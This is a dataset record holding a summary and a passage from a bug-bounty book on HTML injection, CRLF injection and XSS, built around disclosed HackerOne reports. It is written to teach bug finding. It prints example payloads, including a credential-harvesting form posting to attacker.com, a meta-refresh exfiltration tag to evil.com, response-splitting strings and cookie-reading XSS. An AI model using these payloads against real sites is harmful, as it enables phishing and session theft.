    "summary": "HTML injection and content spoofing allow attackers to inject malicious content into web pages, often through fake forms to trick users into submitting sensitive information. These attacks are less severe than others because they rely on social engineering. Content spoofing involves injecting plain text, while HTML injection can alter page structure. XSS vulnerabilities occur when websites render unsanitized user input, enabling malicious JavaScript execution. XSS can be reflected or stored, with stored XSS being more dangerous as it persists on the site. XSS can be exploited through various methods, including manipulating URL parameters and using JavaScript in unexpected contexts. CRLF injection can lead to HTTP request smuggling and response splitting, which can be exploited to manipulate application behavior. XSS and CRLF vulnerabilities can be bypassed using encoding techniques, and it's important to test all input methods and check how sites handle URL parameters. Developers should sanitize user input properly to prevent these vulnerabilities.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n5\nHTML INJECTION AND CONTENT\nSPOOFING\nHypertext Markup Language (HTML) injection and content spoofing\nare attacks that allow a malicious user to inject content into a site’s\nweb pages. The attacker can inject HTML elements of their own\ndesign, most commonly as a <form> tag that mimics a legitimate login\nscreen in order to trick targets into submitting sensitive information to\na malicious site. Because these types of attacks rely on fooling targets\n(a practice sometimes called social engineering), bug bounty\nprograms view content spoofing and HTML injection as less severe\nthan other vulnerabilities covered in this book.\nAn HTML injection vulnerability occurs when a website allows an\nattacker to submit HTML tags, typically via some form input or URL\nparameters, which are then rendered directly on the web page. This is\nsimilar to cross-site scripting attacks, except those injections allow for\nthe execution of malicious JavaScript, which I’ll discuss in Chapter 7.\nHTML injection is sometimes referred to as virtual defacement.\nThat’s because developers use the HTML language to define the\n97\nDownload from www.finelybook.com 7450911@qq.com\nstructure of a web page. So if an attacker can inject HTML and the\nsite renders it, the attacker can change what a page looks like. This\ntechnique of tricking users into submitting sensitive information\nthrough a fake form is referred to as phishing.\nFor example, if a page renders content that you can control, you\nmight be able to add a <form> tag to the page asking the user to reenter\ntheir username and password, like this:\n➊ <form method='POST' action='http://attacker.com/capture.php' id='login-form'>\n<input type='text' name='username' value=''>\n<input type='password' name='password' value=''>\n<input type='submit' value='submit'>\n</form>\nWhen a user submits this form, the information is sent to an\nattacker’s website http://<attacker>.com/capture.php via an action\nattribute ➊.\nContent spoofing is very similar to HTML injection except\nattackers can only inject plaintext, not HTML tags. This limitation is\ntypically caused by sites either escaping any included HTML or\nHTML tags being stripped when the server sends the HTTP response.\nAlthough attackers can’t format the web page with content spoofing,\nthey might be able to insert text, such as a message, that looks as\nthough it’s legitimate site content. Such messages can fool targets into\nperforming an action but rely heavily on social engineering. The\nfollowing examples demonstrate how you can explore these\nvulnerabilities.\nCOINBASE COMMENT INJECTION\nTHROUGH CHARACTER ENCODING\n98\nDownload from www.finelybook.com 7450911@qq.com\nDifficulty: Low\nURL: https://coinbase.com/apps/\nSource: https://hackerone.com/reports/104543/\nDate reported: December 10, 2015\nBounty paid: $200\nSome websites will filter out HTML tags to defend against HTML\ninjection; however, you can sometimes get around this by\nunderstanding how character HTML entities work. For this\nvulnerability, the reporter identified that Coinbase was decoding\nHTML entities when rendering text in its user reviews. In HTML,\nsome characters are reserved because they have special uses (such as\nangle brackets, < >, which start and end HTML tags), whereas\nunreserved characters are normal characters with no special meaning\n(such as letters of the alphabet). Reserved characters should be\nrendered using their HTML entity name; for example, the > character\nshould be rendered by sites as &gt; to avoid injection vulnerabilities.\nBut even an unreserved character can be rendered with its HTML\nencoded number; for example, the letter a can be rendered as &#97;.\nFor this bug, the bug reporter first entered plain HTML into a text\nentry field made for user reviews:\n<h1>This is a test</h1>\nCoinbase would filter the HTML and render this as plaintext, so\nthe submitted text would post as a normal review. It would look\nexactly as entered with the HTML tags removed. However, if the user\nsubmitted text as HTML encoded values, like this:\n&#60;&#104;&#49;&#62;&#84;&#104;&#105;&#115;&#32;&#105;&#115;&#32;&#97;&#\n99\nDownload from www.finelybook.com 7450911@qq.com\n32;&#\n116;&#101;&#115;&#116;&#60;&#47;&#104;&#49;&#62;\nCoinbase wouldn’t filter out the tags and would decode this string\ninto the HTML, which would result in the website rendering the <h1>\ntags in the submitted review:\nThis is a test\nUsing HTML-encoded values, the reporting hacker demonstrated\nhow he could make Coinbase render username and password fields:\n&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#58;&#60;&#98;&#114;&#62;&\n#10;&\n#60;&#105;&#110;&#112;&#117;&#116;&#32;&#116;&#121;&#112;&#101;&#61;&#34;\n&#116\n;&#101;&#120;&#116;&#34;&#32;&#110;&#97;&#109;&#101;&#61;&#34;&#102;&#105;\n&#11\n4;&#115;&#116;&#110;&#97;&#109;&#101;&#34;&#62;&#10;&#60;&#98;&#114;&#62;\n&#10;\n&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#58;&#60;&#98;&#114;&#62;&\n#10;&\n#60;&#105;&#110;&#112;&#117;&#116;&#32;&#116;&#121;&#112;&#101;&#61;&#34;\n&#112\n;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#34;&#32;&#110;&#97;&#109;&#10\n1;&#6\n1;&#34;&#108;&#97;&#115;&#116;&#110;&#97;&#109;&#101;&#34;&#62;\nThis resulted in HTML that would look like the following:\nUsername:<br>\n<input type=\"text\" name=\"firstname\">\n<br>\nPassword:<br>\n<input type=\"password\" name=\"lastname\">\nThis rendered as text input forms that looked like a place to enter a\n100\nDownload from www.finelybook.com 7450911@qq.com\nusername and password login. A malicious hacker could have used the\nvulnerability to trick users into submitting an actual form to a\nmalicious website where they could capture credentials. However, this\nvulnerability depends on users being fooled into believing the login is\nreal and submitting their information, which isn’t guaranteed.\nConsequently, Coinbase rewarded a lower payout compared to a\nvulnerability that wouldn’t have required user interaction.\nTakeaways\nWhen you’re testing a site, check how it handles different types of\ninput, including plaintext and encoded text. Be on the lookout for sites\nthat accept URI-encoded values, like %2F, and render their decoded\nvalues, which in this case would be /.\nYou’ll find a great Swiss army knife that includes encoding tools at\nhttps://gchq.github.io/CyberChef/. Check it out and try the different\ntypes of encoding it supports.\nHACKERONE UNINTENDED HTML\nINCLUSION\nDifficulty: Medium\nURL: https://hackerone.com/reports/<report_id>/\nSource: https://hackerone.com/reports/110578/\nDate reported: January 13, 2016\nBounty paid: $500\nThis example and the following section require an understanding of\nMarkdown, hanging single quotes, React, and the Document Object\nModel (DOM), so I’ll cover these topics first and then how they\n101\nDownload from www.finelybook.com 7450911@qq.com\nresulted in two related bugs.\nMarkdown is a type of markup language that uses a specific syntax\nto generate HTML. For example, Markdown will accept and parse\nplaintext preceded by a hash symbol (#) to return HTML that is\nformatted into header tags. The markup # Some Content will generate\nthe HTML <h1>Some Content</h1>. Developers often use Markdown in\nwebsite editors because it’s an easy language to work with. In\naddition, on sites that allow users to submit input, developers don’t\nneed to worry about malformed HTML because the editor handles\ngenerating the HTML for them.\nThe bugs I’ll discuss here used Markdown syntax to generate an\n<a> anchor tag with a title attribute. Normally, the syntax for this is:\n[test](https://torontowebsitedeveloper.com \"Your title tag here\")\nThe text between the brackets becomes the displayed text, and the\nURL to link to is included in parentheses along with a title attribute,\nwhich is contained in a set of double quotes. This syntax creates the\nfollowing HTML:\n<a href=\"https://torontowebsitedeveloper.com\" title=\"Your title tag here\">test</a>\nIn January 2016, the bug hunter Inti De Ceukelaire noticed that\nHackerOne’s Markdown editor was misconfigured; as a result, an\nattacker could inject a single hanging quote into Markdown syntax\nthat would be included in the generated HTML anywhere HackerOne\nused the Markdown editor. Bug bounty program administration pages\nas well as reports were vulnerable. This was significant: if an attacker\nwas able to find a second vulnerability in an administration page and\ninject a second hanging quote at the beginning of the page in a <meta>\n102\nDownload from www.finelybook.com 7450911@qq.com\ntag (either by injecting the <meta> tag or finding an injection in a\n<meta> tag), they could leverage browser HTML parsing to exfiltrate\npage content. The reason is that <meta> tags tell browsers to refresh\npages via the URL defined in the content attribute of the tag. When\nrendering the page, browsers will perform a GET request to the\nidentified URL. The content in the page can be sent as a parameter of\nthe GET request, which the attacker can use to extract the target’s data.\nHere is what a malicious <meta> tag with an injected single quote\nmight look like:\n<meta http-equiv=\"refresh\" content='0; url=https://evil.com/log.php?text=\nThe 0 defines how long the browser waits before making the HTTP\nrequest to the URL. In this case, the browser would immediately make\nan HTTP request to https://evil.com/log.php?text=. The HTTP request\nwould include all content between the single quote beginning with the\ncontent attribute and the single quote injected by the attacker using the\nMarkdown parser on the web page. Here is an example:\n<html>\n<head>\n<meta http-equiv=\"refresh\" content=➊'0; url=https://evil.com/log.php?text=\n</head>\n<body>\n<h1>Some content</h1>\n--snip--\n<input type=\"hidden\" name=\"csrf-token\" value= \"ab34513cdfe123ad1f\">\n--snip--\n<p>attacker input with '➋ </p>\n--snip--\n</body>\n</html>\nThe contents of the page from the first single quote after the content\n103\nDownload from www.finelybook.com 7450911@qq.com\nattribute at ➊ to the attacker-inputted single quote at ➋ would be sent\nto the attacker as part of the URL’s text parameter. Also included\nwould be the sensitive cross-site request forgery (CSRF) token from\nthe hidden input field.\nNormally, the risk of HTML injection wouldn’t have been an issue\nfor HackerOne because it uses the React JavaScript framework to\nrender its HTML. React is a Facebook library developed to\ndynamically update web page content without having to reload the\nentire page. Another benefit of using React is that the framework will\nescape all HTML unless the JavaScript function\ndangerouslySetInnerHTML is used to directly update the DOM and render\nthe HTML (the DOM is an API for HTML and XML documents that\nallows developers to modify the structure, style, and content of a web\npage via JavaScript). As it turns out, HackerOne was using\ndangerouslySetInnerHTML because it trusted the HTML it was receiving\nfrom its servers; therefore, it was injecting HTML directly into the\nDOM without escaping it.\nAlthough De Ceukelaire couldn’t exploit the vulnerability, he did\nidentify pages where he was able to inject a single quote after\nHackerOne was rendering a CSRF token. So conceptually, if\nHackerOne made a future code change that allowed an attacker to\ninject another single quote in a <meta> tag on the same page, the\nattacker could exfiltrate a target’s CSRF token and perform a CSRF\nattack. HackerOne agreed with the potential risk, resolved the report,\nand awarded De Ceukelaire $500.\nTakeaways\nUnderstanding the nuances of how browsers render HTML and\nrespond to certain HTML tags opens up a vast attack surface.\n104\nDownload from www.finelybook.com 7450911@qq.com\nAlthough not all programs will accept reports about potential\ntheoretical attacks, this knowledge will help you find other\nvulnerabilities. FileDescriptor has a great explanation about the <meta>\nrefresh exploit at https://blog.innerht.ml/csp-\n2015/#contentexfiltration, which I highly recommend you check out.\nHACKERONE UNINTENDED HTML\nINCLUDE FIX BYPASS\nDifficulty: Medium\nURL: https://hackerone.com/reports/<report_id>/\nSource: https://hackerone.com/reports/112935/\nDate reported: January 26, 2016\nBounty paid: $500\nWhen an organization creates a fix and resolves a report, the feature\nwon’t always end up bug-free. After reading De Ceukelaire’s report, I\ndecided to test HackerOne’s fix to see how its Markdown editor was\nrendering unexpected input. To do so, I submitted the following:\n[test](http://www.torontowebsitedeveloper.com \"test ismap=\"alert xss\"\nyyy=\"test\"\")\nRecall that in order to create an anchor tag with Markdown, you\nnormally provide a URL and a title attribute surrounded by double\nquotes in parentheses. To parse the title attribute, Markdown needs to\nkeep track of the opening double quote, the content following it, and\nthe closing quote.\nI was curious as to whether I could confuse Markdown with\nadditional random double quotes and attributes and whether it would\n105\nDownload from www.finelybook.com 7450911@qq.com\nmistakenly begin to track those as well. This is the reason I added\nismap= (a valid HTML attribute), yyy= (an invalid HTML attribute),\nand extra double quotes. After submitting this input, the Markdown\neditor parsed the code into the following HTML:\n<a title=\"test\" ismap=\"alert xss\" yyy=\"test\" ref=\"http://\nwww.toronotwebsitedeveloper.com\">test</a>\nNotice that the fix from De Ceukelaire’s report resulted in an\nunintended bug that caused the Markdown parser to generate arbitrary\nHTML. Although I couldn’t immediately exploit this bug, the\ninclusion of unescaped HTML was enough of a proof of concept for\nHackerOne to revert its previous fix and correct the issue using a\ndifferent solution. The fact that someone could inject arbitrary HTML\ntags could lead to vulnerabilities, so HackerOne awarded me a $500\nbounty.\nTakeaways\nJust because code is updated doesn’t mean all vulnerabilities are fixed.\nBe sure to test changes—and be persistent. When a fix is deployed, it\nmeans there is new code, which could contain bugs.\nWITHIN SECURITY CONTENT SPOOFING\nDifficulty: Low\nURL: https://withinsecurity.com/wp-login.php\nSource: https://hackerone.com/reports/111094/\nDate reported: January 16, 2016\nBounty paid: $250\n106\nDownload from www.finelybook.com 7450911@qq.com\nWithin Security, a HackerOne site meant to share security news, was\nbuilt on WordPress and included a standard WordPress login path at\nthe page withinsecurity.com/wp-login.php. A hacker noticed that\nduring the login process, if an error occurred, Within Security would\nrender an access_denied error message, which also corresponded to the\nerror parameter in the URL:\nhttps://withinsecurity.com/wp-login.php?error=access_denied\nNoticing this behavior, the hacker tried modifying the error\nparameter. As a result, the site rendered values passed to the\nparameter as part of the error message presented to users, and even\nURI-encoded characters were decoded. Here is the modified URL the\nhacker used:\nhttps://withinsecurity.com/wp-login.php?error=Your%20account%20has%20been%20\nhacked%2C%20Please%20call%20us%20this%20number%20919876543210%20OR%20Dr\nop%20\nmail%20at%20attacker%40mail.com&state=cb04a91ac5%257Chttps%253A%252F%252Fw\nithi\nnsecurity.com%252Fwp-admin%252F#\nThe parameter rendered as an error message that displayed above\nthe WordPress login fields. The message directed the user to contact\nan attacker-owned phone number and email.\nThe key here was noticing that the parameter in the URL was\nbeing rendered on the page. Simply testing whether you could change\nthe access_denied parameter revealed this vulnerability.\nTakeaways\nKeep an eye on URL parameters that are passed and rendered as site\ncontent. They may present opportunities for text injection\n107\nDownload from www.finelybook.com 7450911@qq.com\nvulnerabilities that attackers can use to phish targets. Controllable\nURL parameters rendered on a website sometimes result in cross-site\nscripting attacks, which I’ll cover in Chapter 7. Other times this\nbehavior allows only less impactful content spoofing and HTML\ninjection attacks. It’s important to keep in mind that although this\nreport paid $250, it was the minimum bounty for Within Security. Not\nall programs value or pay for HTML injection and content spoofing\nreports because, similar to social engineering, they depend on targets\nbeing fooled by the injected text.\n108\nDownload from www.finelybook.com 7450911@qq.com\nFigure 5-1: The attacker was able to inject this “warning” into the WordPress\nadmin page.\n109\nDownload from www.finelybook.com 7450911@qq.com\nSUMMARY\nHTML injection and content spoofing allow a hacker to input\ninformation and have an HTML page reflect that information back to\na target. Attackers can use these attacks to phish users and trick them\ninto visiting or submitting sensitive information to malicious websites.\nDiscovering these types of vulnerabilities is not only about\nsubmitting plain HTML but also about exploring how a site might\nrender your inputted text. Hackers should be on the lookout for\nopportunities to manipulate URL parameters that are directly rendered\non a site.\n110\nDownload from www.finelybook.com 7450911@qq.com\n6\nCARRIAGE RETURN LINE FEED\nINJECTION\nSome vulnerabilities allow users to input encoded characters that have\nspecial meanings in HTML and HTTP responses. Normally,\napplications sanitize these characters when they are included in user\ninput to prevent attackers from maliciously manipulating HTTP\nmessages, but in some cases, applications either forget to sanitize\ninput or fail to do so properly. When this happens, servers, proxies,\nand browsers may interpret the special characters as code and alter the\noriginal HTTP message, allowing attackers to manipulate an\napplication’s behavior.\nTwo examples of encoded characters are %0D and %0A, which\nrepresent \\n (a carriage return) and \\r (a line feed). These encoded\ncharacters are commonly referred to as carriage return line feeds\n(CRLFs). Servers and browsers rely on CRLF characters to identify\nsections of HTTP messages, such as headers.\nA carriage return line feed injection (CRLF injection)\nvulnerability occurs when an application doesn’t sanitize user input or\n111\nDownload from www.finelybook.com 7450911@qq.com\ndoes so improperly. If attackers can inject CRLF characters into\nHTTP messages, they can achieve the two types of attacks we’ll\ndiscuss in this chapter: HTTP request smuggling and HTTP response\nsplitting attacks. Additionally, you can usually chain a CRLF injection\nwith another vulnerability to demonstrate a greater impact in a bug\nreport, as I’ll demonstrate later in the chapter. For the purpose of this\nbook, we’ll only provide examples of how to exploit a CRLF injection\nto achieve HTTP request smuggling.\nHTTP REQUEST SMUGGLING\nHTTP request smuggling occurs when an attacker exploits a CRLF\ninjection vulnerability to append a second HTTP request to the initial,\nlegitimate request. Because the application does not anticipate the\ninjected CRLF, it initially treats the two requests as a single request.\nThe request is passed through the receiving server (typically a proxy\nor firewall), processed, and then sent on to another server, such as an\napplication server that performs the actions on behalf of the site. This\ntype of vulnerability can result in cache poisoning, firewall evasion,\nrequest hijacking, or HTTP response splitting.\nIn cache poisoning, an attacker can change entries in an\napplication’s cache and serve malicious pages instead of a proper\npage. Firewall evasion occurs when a request is crafted using CRLFs\nto avoid security checks. In a request-hijacking situation, an attacker\ncan steal httponly cookies and HTTP authentication information with\nno interaction between the attacker and client. These attacks work\nbecause servers interpret CRLF characters as indicators of where\nHTTP headers start, so if they see another header, they interpret it as\nthe start of a new HTTP request.\n112\nDownload from www.finelybook.com 7450911@qq.com\nHTTP response splitting, which we’ll focus on in the rest of this\nchapter, allows an attacker to split a single HTTP response by\ninjecting new headers that browsers interpret. An attacker can exploit\na split HTTP response using one of two methods depending on the\nnature of the vulnerability. Using the first method, an attacker uses\nCRLF characters to complete the initial server response and insert\nadditional headers to generate a new HTTP response. However,\nsometimes an attacker can only modify a response and not inject a\ncompletely new HTTP response. For example, they can only inject a\nlimited number of characters. This leads to the second method of\nexploiting response splitting, inserting new HTTP response headers,\nsuch as a Location header. Injecting a Location header would allow an\nattacker to chain the CRLF vulnerability with a redirect, sending a\ntarget to a malicious website, or cross-site scripting (XSS), an attack\nwe’ll cover in Chapter 7.\nV.SHOPIFY.COM RESPONSE SPLITTING\nDifficulty: Medium\nURL: v.shopify.com/last_shop?<YOURSITE>.myshopify.com\nSource: https://hackerone.com/reports/106427/\nDate reported: December 22, 2015\nBounty paid: $500\nIn December 2015, HackerOne user krankopwnz reported that\nShopify wasn’t validating the shop parameter passed into the URL\nv.shopify.com/last_shop?<YOURSITE>.myshopify.com. Shopify sent\na GET request to this URL in order to set a cookie that recorded the\nlast store a user had logged in to. As a result, an attacker could include\n113\nDownload from www.finelybook.com 7450911@qq.com\nthe CRLF characters %0d%0a (capitalization doesn’t matter to\nencoding) in the URL as part of the last_shop parameter. When these\ncharacters were submitted, Shopify would use the full last_shop\nparameter to generate new headers in the HTTP response. Here is the\nmalicious code krankopwnz injected as part of a shop name to test\nwhether this exploit would work:\n%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-\nType:%20\ntext/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>\nBecause Shopify used the unsanitized last_shop parameter to set a\ncookie in the HTTP response, the response included content that the\nbrowser interpreted as two responses. The %20 characters represent\nencoded spaces, which are decoded when the response is received.\nThe response received by the browser was decoded to:\n➊ Content-Length: 0\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 19\n➋ <html>deface</html>\nThe first part of the response would appear after the original HTTP\nheaders. The content length of the original response is declared as 0\n➊, which tells the browser no content is in the response body. Next, a\nCRLF starts a new line and new headers. The text sets up the new\nheader information to tell the browser there is a second response that\nis HTML and that its length is 19. Then the header information gives\nthe browser HTML to render at ➋. When a malicious attacker uses\nthe injected HTTP header, a variety of vulnerabilities are possible;\nthese include XSS, which we will cover in Chapter 7.\n114\nDownload from www.finelybook.com 7450911@qq.com\nTakeaways\nBe on the lookout for opportunities where a site accepts input that it\nuses as part of its return headers, particularly when it’s setting\ncookies. If you see this behavior on a site, try submitting %0D%0A (or\njust %0A%20 in Internet Explorer) to check whether the site is properly\nprotecting against CRLF injections. If it isn’t, test to see whether\nyou’re able to add new headers or an entire additional HTTP response.\nThis vulnerability is best exploited when it occurs with little user\ninteraction, such as in a GET request.\nTWITTER HTTP RESPONSE SPLITTING\nDifficulty: High\nURL: https://twitter.com/i/safety/report_story/\nSource: https://hackerone.com/reports/52042/\nDate reported: March 15, 2015\nBounty paid: $3,500\nWhen you’re looking for vulnerabilities, remember to think outside\nthe box and submit encoded values to see how a site handles the input.\nIn some cases, sites will protect against CRLF injection by using a\nblacklist. In other words, the site will check for any blacklisted\ncharacters in inputs, then respond accordingly by removing those\ncharacters or not allowing the HTTP request to be made. However, an\nattacker can sometimes circumvent a blacklist by using character\nencoding.\nIn March 2015, FileDescriptor manipulated how Twitter handled\ncharacter encoding to find a vulnerability that allowed him to set a\ncookie through an HTTP request.\n115\nDownload from www.finelybook.com 7450911@qq.com\nThe HTTP request that FileDescriptor tested included a\nreported_tweet_id parameter when sent to\nhttps://twitter.com/i/safety/report_story/ (a Twitter relic that allowed\nusers to report inappropriate ads). When responding, Twitter would\nalso return a cookie that included the parameter submitted with the\nHTTP request. During his tests, FileDescriptor noted that the CR and\nLF characters were blacklisted and sanitized. Twitter would replace\nany LFs with a space and send back an HTTP 400 (Bad Request\nError) when it received any CRs, thus protecting against CRLF\ninjections. But FileDescriptor knew of a Firefox bug that incorrectly\ndecoded cookies and potentially could allow users to inject malicious\npayloads to a website. The knowledge of this bug led him to test\nwhether a similar bug could exist on Twitter.\nIn the Firefox bug, Firefox would strip any Unicode characters in\ncookies outside of the ASCII character range. However, Unicode\ncharacters can consist of multiple bytes. If certain bytes in a multibyte\ncharacter were stripped, the remaining bytes could result in malicious\ncharacters being rendered on a web page.\nInspired by the Firefox bug, FileDescriptor tested whether an\nattacker could sneak a malicious character through Twitter’s blacklist\nusing the same multibyte character technique. So FileDescriptor found\na Unicode character whose encoding ended with %0A (a LF) but\nwhose other bytes were not included in the HTTP character set. He\nused the Unicode character , which is hex encoded as U+560A (56\n0A). But when this character is used in a URL, it is URL encoded with\nUTF-8 as %E5%98%8A. These three bytes, %E3, %98, %8A,\ncircumvented Twitter’s blacklist because they are not malicious\ncharacters.\nWhen FileDescriptor submitted this value, he found that Twitter\n116\nDownload from www.finelybook.com 7450911@qq.com\nwouldn’t sanitize the URL-encoded character but would still decode\nthe UTF-8 %E5%98%8A value back to its Unicode value 56 0A. Twitter\nwould drop the 56 as an invalid character, leaving the line feed\ncharacters 0A untouched. In addition, he found that the character\n(which is encoded to 56 0D) could be used to insert the necessary\ncarriage return (%0D) into the HTTP response as well.\nOnce he confirmed that the method worked, FileDescriptor passed\nthe value %E5%98%8A%E5%98%8DSet-Cookie:%20test into Twitter’s\nURL parameter. Twitter would decode the characters, strip the out-of-\nrange characters, and leave %0A and %0D in the HTTP request,\nresulting in the value %0A%0DSet-Cookie:%20test. The CRLF would\nsplit the HTTP response into two so the second response would\nconsist of just the Set-Cookie: test value, which is the HTTP header used\nto set cookies.\nCRLF attacks can be even more dangerous when they allow for\nXSS attacks. While the details of exploiting XSS aren’t important for\nthis example, it should be noted that FileDescriptor went further with\nthis proof of concept. He demonstrated to Twitter how this CRLF\nvulnerability could be exploited to execute malicious JavaScript with\nthe following URL:\nhttps://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5\n%98%8A%E5%98%8Dcontent-\ntype:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5\n%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29\n%E5%98%BE\nThe important details are the 3-byte values peppered throughout:\n%E5%98%8A, %E5%98%8D, %E5%98%BC, and %E5%98%BE. After\ncharacter stripping, these values are decoded to %0A, %0D, %3C, and\n117\nDownload from www.finelybook.com 7450911@qq.com\n%3E, respectively, all of which are HTML special characters. The byte\n%3C is the left angle bracket (<), and %3E is the right angle bracket (>).\nThe other characters in the URL are included in the HTTP\nresponse as written. Therefore, when the encoded byte characters are\ndecoded with line breaks, the header looks like this:\nhttps://twitter.com/login?redirect_after_login=https://twitter.com:21/\ncontent-type:text/html\nlocation:\n<svg/onload=alert(innerHTML)>\nThe payload is decoded to inject the header content-type text/html,\nwhich tells the browser the response will contain HTML. The Location\nheader uses a <svg> tag to execute the JavaScript code alert(innerHTML).\nThe alert creates an alert box that contains the contents of the web\npage using the DOM innerHTML property (the innerHTML property\nreturns the HTML of a given element). In this case, the alert would\ninclude the logged-in user’s session and authentication cookies,\ndemonstrating that an attacker could steal these values. Stealing the\nauthentication cookie would have allowed an attacker to log into a\ntarget’s account, which explains why FileDescriptor was awarded a\n$3,500 bounty for finding this vulnerability.\nTakeaways\nIf a server is somehow sanitizing the characters %0D%0A, think about\nhow the website might be doing that and whether you can circumvent\nits efforts, such as through double encoding. You can test whether the\nsite is mishandling extra values by passing multibyte characters and\ndetermining whether they are decoded into other characters.\n118\nDownload from www.finelybook.com 7450911@qq.com\nSUMMARY\nCRLF vulnerabilities allow attackers to manipulate HTTP responses\nby altering their headers. Exploiting CRLF vulnerabilities can lead to\ncache poisoning, firewall evasion, request hijacking, or HTTP\nresponse splitting. Because a CRLF vulnerability is caused by a site\nreflecting back the unsanitized user input %0D%0A in its headers, it’s\nimportant to monitor and review all HTTP responses when hacking.\nAdditionally, if you do find input you can control being returned in\nHTTP headers, but the characters %0D%0A are being sanitized, try\nincluding multibyte-encoded input as FileDescriptor did to determine\nhow the site handles decoding it.\n119\nDownload from www.finelybook.com 7450911@qq.com\n7\nCROSS-SITE SCRIPTING\nOne of the most famous examples of a cross-site scripting (XSS)\nvulnerability is the Myspace Samy Worm created by Samy Kamkar.\nIn October 2005, Kamkar exploited a vulnerability on Myspace that\nallowed him to store a JavaScript payload on his profile. Whenever a\nlogged-in user would visit his Myspace profile, the payload code\nwould execute, making the viewer Kamkar’s friend on Myspace and\nupdating the viewer’s profile to display the text “but most of all, samy\nis my hero.” Then the code would copy itself to the viewer’s profile\nand continue infecting other Myspace user pages.\nAlthough Kamkar didn’t create the worm with malicious intent, the\ngovernment raided Kamkar’s residence as a result. Kamkar was\narrested for releasing the worm and pleaded guilty to a felony charge.\nKamkar’s worm is an extreme example, but his exploit shows the\nbroad impact an XSS vulnerability could have on a website. Similar to\nother vulnerabilities I’ve covered so far, XSS occurs when websites\nrender certain characters unsanitized, causing browsers to execute\nmalicious JavaScript. Characters that allow an XSS vulnerability to\noccur include double quotes (\"), single quotes ('), and angle brackets (<\n120\nDownload from www.finelybook.com 7450911@qq.com\n>).\nIf a site properly sanitizes characters, the characters render as\nHTML entities. For example, the page source for a web page would\nshow these characters as follows:\nA double quote (\") as &quot; or &#34;\nA single quote (') as &apos; or &#39;\nAn opening angle bracket (<) as &lt; or &#60;\nA closing angle bracket (>) as &gt; or &#62;\nThese special characters, when unsanitized, define a web page’s\nstructure in HTML and JavaScript. For example, if a site doesn’t\nsanitize angle brackets, you could insert <script></script> to inject a\npayload, like this:\n<script>alert(document.domain);</script>\nWhen you submit this payload to a website that renders it\nunsanitized, the <script></script> tags instruct the browser to execute the\nJavaScript between them. The payload executes the alert function,\ncreating a pop-up dialog that displays the information passed to alert.\nThe reference to document inside the parentheses is the DOM, which\nreturns the domain name of the site. For example, if the payload\nexecutes on https://www.<example>.com/foo/bar/, the pop-up dialog\ndisplays www.<example>.com.\nWhen you’ve found an XSS vulnerability, confirm its impact\nbecause not all XSS vulnerabilities are the same. Confirming the\nimpact of a bug and including this analysis improves your report,\nhelps triagers validate your bug, and might raise your bounty.\nFor example, an XSS vulnerability on a site that doesn’t use the\n121\nDownload from www.finelybook.com 7450911@qq.com\nhttponly flag on sensitive cookies is different from an XSS\nvulnerability that does. When a site has no httponly flag, your XSS can\nread cookie values; if those values include session-identifying\ncookies, you could steal a target’s session and access their account.\nYou can alert document.cookie to confirm that you can read sensitive\ncookies (knowing which cookies a site considers sensitive requires\ntrial and error on each site). Even when you can’t access sensitive\ncookies, you can alert document.domain to confirm whether you can\naccess sensitive user information from the DOM and perform actions\non behalf of the target.\nBut the XSS might not be a vulnerability for the site if you don’t\nalert the correct domain. For example, if you alert document.domain\nfrom a sandboxed iFrame, your JavaScript could be harmless because\nit can’t access cookies, perform actions on the user’s account, or\naccess sensitive user information from the DOM.\nThe JavaScript is rendered harmless because browsers implement a\nSame Origin Policy (SOP) as a security mechanism. The SOP restricts\nhow documents (the D in DOM) can interact with resources loaded\nfrom another origin. The SOP protects innocent websites from\nmalicious sites attempting to exploit the website through the user. For\nexample, if you visited www.<malicious>.com and it invoked a GET\nrequest to www.<example>.com/profile in your browser, the SOP\nwould prevent www.<malicious>.com from reading the www.\n<example>.com/profile response. The www.<example>.com site\nmight allow sites from a different origin to interact with it, but usually\nthose interactions are limited to specific websites www.\n<example>.com trusts.\nA website’s protocol (e.g., HTTP or HTTPS), host (e.g., www.\n<example>.com), and port determine a site’s origin. Internet Explorer\n122\nDownload from www.finelybook.com 7450911@qq.com\nis an exception to this rule. It doesn’t consider the port to be part of\nthe origin. Table 7-1 shows examples of origins and whether they\nwould be considered the same as http://www.<example>.com/.\nTable 7-1: Examples of SOP\nURL Same Reason\norigin?\nhttp://www.<example>.com/countries Yes N/A\nhttp://www. Yes N/A\n<example>.com/countries/Canada\nhttps://www.<example>.com/countries No Different\nprotocol\nhttp://store.<example>.com/countries No Different\nhost\nhttp://www.<example>.com:8080/countries No Different\nport\nIn some situations, the URL won’t match the origin. For example,\nabout:blank and javascript: schemes inherit the origin of the document\nopening them. The about:blank context accesses information from or\ninteracts with the browser, whereas javascript: executes JavaScript. The\nURL doesn’t provide information about its origin, so browsers handle\nthese two contexts differently. When you find an XSS vulnerability,\nusing alert(document.domain) in your proof of concept is helpful: it\nconfirms the origin where the XSS executes, especially when the URL\nshown in the browser is different from the origin the XSS executes\n123\nDownload from www.finelybook.com 7450911@qq.com\nagainst. This is exactly what happens when a website opens a\njavascript: URL. If www.<example>.com opened a\njavascript:alert(document.domain) URL, the browser address would show\njavascript:alert(document.domain). But the alert box would show www.\n<example>.com because the alert inherits the origin of the previous\ndocument.\nAlthough I’ve only covered an example that uses the HTML\n<script> tag to achieve XSS, you can’t always submit HTML tags when\nyou find a potential injection. In those cases, you might be able to\nsubmit single or double quotes to inject an XSS payload. The XSS\ncould be significant depending on where your injection occurs. For\nexample, let’s say you can access the following code’s value attribute:\n<input type=\"text\" name=\"username\" value=\"hacker\" width=50px>\nBy injecting a double quote in the value attribute, you could close\nthe existing quote and inject a malicious XSS payload into the tag.\nYou might do this by changing the value attribute to hacker\"\nonfocus=alert(document.cookie) autofocus \", which would result in the\nfollowing:\n<input type=\"text\" name=\"username\" value=\"hacker\"\nonfocus=alert(document.cookie) autofocus \"\" width=50px>\nThe autofocus attribute instructs the browser to place 